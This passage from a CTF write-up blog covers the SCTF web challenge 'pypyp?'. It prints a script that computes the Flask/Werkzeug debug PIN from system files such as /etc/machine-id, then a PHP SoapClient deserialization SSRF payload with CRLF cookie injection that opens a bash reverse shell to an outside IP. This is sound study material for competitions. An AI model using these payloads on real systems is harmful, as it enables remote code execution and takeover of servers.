function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f"<span class="subst">{pin}</span> added salt"</span>.encode(<span class="string">"utf-8"</span>, <span class="string">"replace"</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin</span>(<span class="params">args</span>):</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    username = args.username</span><br><span class="line">    modname = args.modname</span><br><span class="line">    appname = args.appname</span><br><span class="line">    fname = args.basefile</span><br><span class="line">    probably_public_bits = [username, modname, appname, fname]</span><br><span class="line">    private_bits = [args.uuid, args.machineid]</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, text_type):</span><br><span class="line">            bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don't</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">        num = (<span class="string">'%09d'</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don't have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    hash_pin(rv)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Cookie: "</span>, cookie_name + <span class="string">"="</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(time.time())) + <span class="string">'|'</span> + hash_pin(rv))</span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    versions = [<span class="string">"2.7"</span>, <span class="string">"3.0"</span>, <span class="string">"3.1"</span>, <span class="string">"3.2"</span>, <span class="string">"3.3"</span>, <span class="string">"3.4"</span>, <span class="string">"3.5"</span>, <span class="string">"3.6"</span>, <span class="string">"3.7"</span>, <span class="string">"3.8"</span>]</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"tool to get the flask debug pin from system information"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--username"</span>, required=<span class="literal">False</span>, default=<span class="string">"www-data"</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The username of the user running the web server"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--modname"</span>, required=<span class="literal">False</span>, default=<span class="string">"flask.app"</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The module name (app.__module__ or app.__class__.__module__)"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--appname"</span>, required=<span class="literal">False</span>, default=<span class="string">"Flask"</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The app name (app.__name__ or app.__class__.__name__)"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--basefile"</span>, required=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--uuid"</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--machineid"</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">"System machine ID (非docker环境：/etc/machine-id  docker环境： /proc/sys/kernel/random/boot_id+/proc/self/cgroup)"</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.basefile <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[!] App.py base path not provided, trying for most versions of python\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> versions:</span><br><span class="line">            args.basefile = <span class="string">f"/usr/local/lib/python<span class="subst">{v}</span>/dist-packages/flask/app.py"</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"PIN Python <span class="subst">{v}</span>: <span class="subst">{get_pin(args)}</span>\n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"PIN: "</span>, get_pin(args))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其中需要获取的参数的方法如下：</p>
+<ul>
+<li><p>username：通过查看/etc/passwd可以看到全部的用户，有一个叫做app的，是这个用户</p>
+</li>
+<li><p>modename：默认值为flask.app，不需要改</p>
+</li>
+<li><p>appname：默认值为Flask，不需要改</p>
+</li>
+<li><p>basefile：app.py的存放位置，这里可以猜，大部分默认都是<code>/usr/lib/python3.x/site-packages/flask/app.py</code>，这里python版本是3.8（猜的），也可以通过FileSystemIterator这个原生类来看一下具体的版本：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191325115.png"></p>
+</li>
+<li><p>uuid：一般读取这个文件：<code>/sys/class/net/eth0/address</code>的十进制</p>
+</li>
+<li><p>machineid：题目是docker环境，所以是<code>/proc/sys/kernel/random/boot_id</code>后拼接<code>/proc/sys/kernel/random/boot_id+/proc/self/cgroup</code>的docker部分</p>
+</li>
+</ul>
+<p>算出pin码和cookie为：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191641000.png"></p>
+<p>然后就可以进入console中执行命令了，我们可以本地起一个Flask进入到调试模式中执行命令看看传参是什么样的：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191950887.png"></p>
+<p>抓一下输入pin码时的包：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192202208.png"></p>
+<p>再抓一个console中执行命令时的包（这里就会发现执行命令时是需要Cookie的，这时候之前算好的Cookie就派上用场了），然后这里发现参数是需要传入一个s的，也就是Flask服务的SecretKey，我们去访问题目环境的console路由就可以看到：<br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192245257.png"></p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192559845.png"></p>
+<p>然后就可以构造RCE的数据包了，我们现在有RCE所需的参数，然后考虑是否可以通过这里传参从而RCE，答案是不行的，因为Cookie没办法传过去：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'http://127.0.0.1:5000/'</span>.<span class="variable">$properties</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以我们又要通过一个原生类来构造SSRF，从而访问5000端口的这个Flask服务了，用到的是SoapClient这个原生类，可以理解成直接对target发起一次请求：</p>
+<blockquote>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SoapClient {</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>该类的构造函数如下：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
+<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
+</ul>
+</blockquote>
+<p>看到这段代码：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>)&amp;&amp;<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>))){</span><br><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line"><span class="variable">$object</span> -&gt; <span class="title function_ invoke__">sctf</span>();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到$object调用了sctf()这个方法，其实就是调用_call然后打SSRF</p>
+<p>构造出如下payload：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sop</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test\r\nCookie: __wzdb2a60e2b19822632a67c=1687701860|11b8517fb9fb"</span>,<span class="string">'location'</span>=&gt;<span class="string">'http://127.0.0.1:5000/console?__debugger__=yes&amp;cmd=__import__("os").popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20/dev/tcp/43.143.246.73/7777%200%3E%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9'</span>,<span class="string">'uri'</span>=&gt;<span class="string">'test'</span>));</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">"properties"</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sop</span>)));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>拿到shell后直接suid提权就可以读取flag</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221633078.png"></p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221745358.png"></p>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/SCTF/">#SCTF</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/06/08/Shiro550/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Shiro550</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
+              appKey: '7gIuYJ9YQk94en6wRudankYd',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'Hi speak something！',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('https://ycemvr5n.api.lncldglobal.com') {
+              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'y1zh3e7'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SCTF-Web%E5%A4%8D%E7%8E%B0"><span class="nav-text">SCTF-Web复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezcheck1n"><span class="nav-text">ezcheck1n</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pypyp"><span class="nav-text">pypyp?</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2023</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">y1zh3e7</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
